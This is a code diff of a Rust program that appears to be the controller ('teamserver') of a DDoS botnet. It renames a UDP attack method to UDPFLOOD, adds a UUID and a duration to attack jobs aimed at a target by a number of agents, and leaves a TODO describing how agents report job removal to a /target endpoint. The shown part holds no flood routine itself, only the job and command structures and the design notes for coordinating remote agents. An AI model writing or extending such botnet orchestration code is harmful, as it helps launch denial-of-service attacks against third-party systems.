@@ -1,7 +1,7 @@
 mod listener;
 mod teamserver;
 
-use std::{fs, io::Read, str::FromStr, sync::Arc};
+use std::{fs, io::Read, str::FromStr, sync::Arc, time::Duration};
 
 use toml;
 use serde::{Serialize, Deserialize};
@@ -30,7 +30,7 @@ struct ProfileAgents {
 #[derive(Serialize, PartialEq)]
 enum AttackMethod { 
     HTTP,
-    UDP
+    UDPFLOOD
 }
 
 impl FromStr for AttackMethod {
@@ -38,7 +38,7 @@ impl FromStr for AttackMethod {
     fn from_str(s: &str) -> Result<Self, Self::Err> {
         match s {
             "HTTP" => Ok(AttackMethod::HTTP),
-            "UDP" => Ok(AttackMethod::UDP),
+            "UDPFLOOD" => Ok(AttackMethod::UDPFLOOD),
             _ => Err(())
         }
         
@@ -47,8 +47,10 @@ impl FromStr for AttackMethod {
 
 #[derive(Serialize)]
 struct Job {
+    uuid: String,
     target: String,
     method: AttackMethod,
+    duration: Duration,
     agents: isize,
 }
 
@@ -70,6 +72,11 @@ struct MAShared {
 }
 
 // TODO: Add: agent building
+// TODO: Add: "remove job": for removing a job you need to add a UUID to the Job struct. When remove job
+// is called add to the job UUID to a "removed jobs" and can be accessible via /target endpoint, when
+// agents did remove the attack job, then sent a POST request to /target saying "removed job". if
+// removed job counter is equal to agents that say "removed job", server removes UUID job to
+// "removed job"
 
 #[tokio::main]
 async fn main() -> Result<(), std::io::Error> {
